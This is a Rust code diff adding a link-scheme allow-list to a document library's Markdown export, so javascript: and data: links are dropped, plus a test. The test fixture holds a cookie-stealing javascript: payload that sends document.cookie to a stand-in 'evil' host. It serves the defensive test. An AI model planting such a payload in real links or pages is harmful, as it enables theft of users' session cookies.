@@ -106,6 +106,17 @@ fn inline(text: &str, base: RunProps) -> Vec<Run> {
 /// Plain-text export (one line per paragraph, list markers kept as text).
 pub fn to_text(doc: &Document) -> String { doc.text().replace(crate::chars::OBJECT, "") }
 
+/// wordcraft #679: a link target fit to write into exported files: web, mail, an in-document
+/// `#bookmark` or a relative path, never `javascript:`, `data:`, `file:` or other schemes.
+pub fn safe_link(target: &str) -> bool {
+    let t = target.trim();
+    let scheme = t.split_once(':').map(|(s, _)| s).filter(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || "+-.".contains(c)) && !s.contains(['/', '#', '?']));
+    match scheme {
+        Some(s) => ["http", "https", "mailto", "ftp", "tel"].iter().any(|ok| s.eq_ignore_ascii_case(ok)),
+        None => !t.chars().any(|c| c.is_control()),
+    }
+}
+
 /// Markdown export of headings, lists and emphasis.
 pub fn to_markdown(doc: &Document) -> String {
     let mut out = String::new();
@@ -123,7 +134,7 @@ pub fn to_markdown(doc: &Document) -> String {
             let mut t = r.text.replace(['\u{000B}', '\u{000C}'], "  \n");
             if rf.bold && f.outline_level >= 6 && !t.trim().is_empty() { t = format!("**{t}**"); }
             if rf.italic && !t.trim().is_empty() { t = format!("*{t}*"); }
-            if let Some(l) = &r.link { t = format!("[{t}]({l})"); }
+            if let Some(l) = r.link.as_deref().filter(|l| safe_link(l)) { t = format!("[{t}]({})", l.replace(' ', "%20").replace(')', "%29")); }
             line.push_str(&t);
         }
         out.push_str(&line);
@@ -143,5 +154,18 @@ mod tests {
         assert!(d.run_format(&d.paragraphs[1], &d.paragraphs[1].runs[1]).bold);
         let md = to_markdown(&d);
         assert!(md.contains("# Title") && md.contains("**bold**") && md.contains("- two"));
+    }
+    #[test]
+    fn markdown_export_drops_unsafe_link_targets() {
+        // wordcraft #679: a received document's javascript: link must not become a live Markdown link.
+        let mut d = from_markdown("[safe](https://x.y) [mail](mailto:a@b.c) [bm](#top) [rel](notes/a.md)\n");
+        let p = &mut d.paragraphs[0];
+        p.runs.push(Run { text: "evil".into(), link: Some("javascript:fetch('https://evil/?c='+document.cookie)".into()), ..Default::default() });
+        p.runs.push(Run { text: "data".into(), link: Some(" DATA:text/html,<script>".into()), ..Default::default() });
+        p.runs.push(Run { text: "رابط".into(), link: Some("https://example.com/مرحبا بك".into()), ..Default::default() });
+        let md = to_markdown(&d);
+        for ok in ["[safe](https://x.y)", "[mail](mailto:a@b.c)", "[bm](#top)", "[rel](notes/a.md)", "[رابط](https://example.com/مرحبا%20بك)"] { assert!(md.contains(ok), "{ok} in {md}"); }
+        assert!(!md.contains("javascript") && !md.contains("DATA:"), "{md}");
+        assert!(md.contains("evil") && md.contains("data"), "the text stays");
     }
 }
